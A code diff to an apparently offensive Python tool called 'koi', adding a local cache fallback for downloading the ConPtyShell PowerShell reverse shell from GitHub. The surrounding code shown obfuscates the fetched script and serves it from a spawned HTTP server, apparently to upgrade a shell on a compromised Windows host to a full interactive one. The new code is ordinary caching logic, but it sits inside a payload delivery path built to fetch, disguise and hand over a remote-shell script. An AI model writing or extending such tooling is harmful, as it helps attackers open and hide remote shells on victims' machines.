@@ -7,6 +7,7 @@ import urllib.request
 from typing import Callable, Dict, Optional
 
 from koi.session import Session
+from koi.utils.cache import load_conptyshell, save_conptyshell, cache_exists, conpty_cache_path
 from koi.utils.ps_obfuscate import obfuscate_conptyshell
 from koi.utils.tcp import spawn_http_server
 from koi.utils.ui import Spinner, notify, _b, _p
@@ -15,6 +16,31 @@ _CONPTYSHELL_URL = (
     "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
     "/master/Invoke-ConPtyShell.ps1"
 )
+
+
+def _fetch_conptyshell() -> tuple[bytes, str]:
+    """
+    Fetch ConPtyShell, with a local cache as fallback.
+
+    Strategy:
+      1. Try to download the latest version from GitHub.
+         On success → update the cache and return the fresh bytes.
+      2. If the network request fails and a cached copy exists → use it.
+      3. If neither works → raise the original network exception.
+
+    Returns:
+        (ps1_data, source_label) where source_label is "remote" or "cache".
+    """
+    try:
+        with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=15) as resp:
+            ps1_data = resp.read()
+        save_conptyshell(ps1_data)           # keep the cache fresh
+        return ps1_data, "remote"
+    except Exception as exc:
+        cached = load_conptyshell()
+        if cached is not None:
+            return cached, "cache"
+        raise exc                            # no cache either — bubble up
 
 
 def upgrade_windows_conptyshell(
@@ -37,11 +63,15 @@ def upgrade_windows_conptyshell(
 
     with Spinner("Fetching ConPtyShell…"):
         try:
-            with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=15) as resp:
-                ps1_data = resp.read()
+            ps1_data, source = _fetch_conptyshell()
         except Exception as exc:
             notify('error', f"Failed to fetch ConPtyShell: {exc}")
             return
+
+    if source == "cache":
+        notify('warning', f"Network unavailable — using cached ConPtyShell ({conpty_cache_path()})")
+    else:
+        notify('info', "ConPtyShell fetched from remote (cache updated)")
 
     ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
     http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
